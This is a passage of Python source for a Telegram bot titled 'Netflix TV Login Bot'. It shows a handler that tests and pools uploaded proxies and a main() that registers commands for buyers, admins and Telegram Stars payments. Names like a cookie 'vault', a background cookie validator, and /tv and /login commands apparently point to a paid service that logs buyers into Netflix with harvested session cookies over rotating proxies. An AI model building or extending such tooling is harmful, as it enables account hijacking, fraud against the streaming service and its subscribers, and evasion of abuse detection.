    replied = update.message.reply_to_message
    if not replied or not replied.document:
        await update.message.reply_text(
            "📎 Reply to a proxy .txt file with /addproxy\n\nFormats: host:port, http://host:port, socks5://user:pass@host:port",
            parse_mode=ParseMode.HTML); return
    doc = replied.document
    if not (doc.file_name or "").lower().endswith(".txt"):
        await update.message.reply_text("❌ Proxy file must be .txt"); return
    status_msg = await update.message.reply_text("🔍 <b>Testing proxies...</b>", parse_mode=ParseMode.HTML)
    try:
        file = await context.bot.get_file(doc.file_id)
        raw  = await file.download_as_bytearray()
        lines  = bytes(raw).decode("utf-8", errors="ignore").splitlines()
        parsed = [p for p in (parse_proxy_line(l) for l in lines) if p]
        if not parsed: await status_msg.edit_text("❌ No valid proxy lines found."); return
        alive_new = [p for p in parsed if _test_proxy(p)]
        dead_count = len(parsed) - len(alive_new)
        with proxy_lock:
            existing_urls = {pp.get("_url", pp.get("http","")) for pp in _live_proxies}
            added = 0
            for p in alive_new:
                url = p.get("_url", p.get("http",""))
                if url not in existing_urls: _live_proxies.append(p); existing_urls.add(url); added += 1
            total_live = len(_live_proxies)
        await status_msg.edit_text(
            f"✅ <b>Proxy Upload Complete!</b>\n📋 Parsed: {len(parsed)}\n✅ Added: {added}\n💀 Dead: {dead_count}\n🔄 Total live: {total_live}",
            parse_mode=ParseMode.HTML)
    except Exception as e: await status_msg.edit_text(f"❌ {e}")

# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════
def main():
    print("═" * 60)
    print("  Netflix TV Login Bot — Final Edition v4.0")
    print("═" * 60)
    init_db()
    load_and_test_proxies()
    print(f"  Vault alive   : {count_vault()}")
    print(f"  Live proxies  : {len(_live_proxies)}")
    print(f"  Admin IDs     : {ADMIN_IDS}")
    print()

    app = Application.builder().token(BOT_TOKEN).build()

    # User commands
    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("tv",     cmd_tv))
    app.add_handler(CommandHandler("stats",  cmd_stats))
    app.add_handler(CommandHandler("login",  cmd_login))
    app.add_handler(CommandHandler("help",   cmd_help))

    # Admin commands
    app.add_handler(CommandHandler("status",        cmd_adminstatus))
    app.add_handler(CommandHandler("addcredits",    cmd_addcredits))
    app.add_handler(CommandHandler("resetcredits",  cmd_resetcredits))
    app.add_handler(CommandHandler("clearvault",    cmd_clearvault))
    app.add_handler(CommandHandler("users",         cmd_users))
    app.add_handler(CommandHandler("broadcast",     cmd_broadcast))
    app.add_handler(CommandHandler("ban",           cmd_ban))
    app.add_handler(CommandHandler("unban",         cmd_unban))
    app.add_handler(CommandHandler("userinfo",      cmd_userinfo))
    app.add_handler(CommandHandler("approvepay",    cmd_approvepay))
    app.add_handler(CommandHandler("rejectpay",     cmd_rejectpay))
    app.add_handler(CommandHandler("payments",      cmd_payments))
    app.add_handler(CommandHandler("testvault",     cmd_testvault))
    app.add_handler(CommandHandler("upload",        cmd_upload))
    app.add_handler(CommandHandler("addproxy",      cmd_addproxy))

    # Payments
    app.add_handler(PreCheckoutQueryHandler(pre_checkout))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, stars_payment_success))

    # Inline buttons
    app.add_handler(CallbackQueryHandler(cb_handler))

    # Messages — state machine (text + files, shared for users & admin file handler)
    app.add_handler(MessageHandler(filters.Document.ALL, document_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    # Background validator
    async def post_init(application):
        asyncio.create_task(background_cookie_validator(application))
    app.post_init = post_init

    print("  Bot is running! Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  Stopped.")
        sys.exit(0)
